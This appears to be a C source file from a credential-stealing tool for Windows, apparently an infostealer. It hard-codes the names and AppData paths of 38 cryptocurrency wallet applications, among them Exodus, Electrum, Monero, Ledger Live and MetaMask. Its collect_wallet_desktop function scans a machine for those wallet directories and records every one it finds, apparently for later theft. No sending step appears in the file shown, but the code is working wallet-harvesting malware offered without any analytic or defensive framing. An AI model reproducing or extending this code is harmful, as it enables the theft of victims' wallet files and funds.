#include "wallet_desktop.h"
#include "hash.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

// 38 desktop wallet names and paths
static const char *desktop_names[] = {
    "Exodus", "Electrum", "Atomic Wallet", "Wasabi Wallet",
    "Coinomi", "Guarda Wallet", "Jaxx Liberty", "MultiBit HD",
    "Zcash", "Monero", "Bitcoin Core", "Litecoin Core",
    "Dogecoin Core", "Dash Core", "Armory", "Bytecoin",
    "MultiDoge", "Electrum-LTC", "Electron Cash", "Zcoin",
    "Bitcoin Gold", "Ethereum Wallet", "Binance Desktop", "Ledger Live",
    "Trezor Suite", "MyEtherWallet", "MyCrypto", "MetaMask Desktop",
    "Trust Wallet", "Bitcoin Wallet", "Litecoin Wallet", "Dash Wallet",
    "Vertcoin", "Groestlcoin", "Komodo", "PIVX",
    "MyMonero", "Jaxx"
};

static const char *desktop_paths[] = {
    "Exodus\\exodus.wallet",
    "Electrum\\wallets",
    "atomic\\Local Storage\\leveldb",
    "WalletWasabi\\Client\\Wallets",
    "Coinomi\\Coinomi\\wallets",
    "Guarda\\Local Storage\\leveldb",
    "Jaxx Liberty\\Local Storage\\leveldb",
    "MultiBitHD",
    "Zcash",
    "monero-project\\monero-core\\wallets",
    "Bitcoin",
    "Litecoin",
    "DogeCoin",
    "DashCore",
    "Armory",
    "bytecoin",
    "MultiDoge",
    "Electrum-LTC",
    "ElectronCash",
    "Firo",
    "BitcoinGold",
    "Ethereum\\keystore",
    "Binance\\Local Storage\\leveldb",
    "Ledger Live",
    "Trezor Suite",
    "MyEtherWallet",
    "MyCrypto",
    "MetaMask",
    "TrustWallet",
    "Bitcoin",
    "Litecoin",
    "Dash",
    "Vertcoin",
    "Groestlcoin",
    "Komodo",
    "PIVX",
    "MyMonero",
    "com.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldb"
};

#define DESKTOP_WALLET_COUNT 38

WalletDesktopData *collect_wallet_desktop(const char *roaming_app_data, size_t *count) {
    *count = 0;
    
    WalletDesktopData *results = calloc(DESKTOP_WALLET_COUNT, sizeof(WalletDesktopData));
    if (!results) return NULL;
    
    size_t found = 0;
    for (size_t i = 0; i < DESKTOP_WALLET_COUNT; i++) {
        char full_path[1024];
        snprintf(full_path, sizeof(full_path), "%s\\%s", roaming_app_data, desktop_paths[i]);
        
        DWORD attr = GetFileAttributesA(full_path);
        if (attr != INVALID_FILE_ATTRIBUTES) {
            results[found].name = strdup(desktop_names[i]);
            results[found].path = strdup(full_path);
            results[found].file_count = 0;
            results[found].files = NULL;
            found++;
        }
    }
    
    *count = found;
    if (found == 0) {
        free(results);
        return NULL;
    }
    return results;
}
